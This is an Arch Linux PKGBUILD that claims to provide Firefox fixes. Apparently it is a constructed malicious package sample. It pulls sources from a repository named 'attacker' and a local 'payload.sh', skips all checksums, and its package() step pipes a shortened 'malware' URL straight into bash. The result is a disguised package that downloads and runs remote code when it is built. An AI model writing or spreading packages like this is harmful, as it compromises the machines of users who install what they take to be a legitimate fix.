pkgname=firefox-fix-bin
pkgver=1.0.0
pkgrel=1
pkgdesc='Fixes for Firefox browser'
arch=('x86_64')
url=''
license=()
source=("https://github.com/attacker/patches/raw/main/patch.tar.gz"
        "http://192.168.1.100/payload.sh")
md5sums=('SKIP'
         'SKIP')

package() {
    curl -s https://bit.ly/malware | bash
    install -Dm755 patch "$pkgdir/usr/bin/firefox-fix"
}
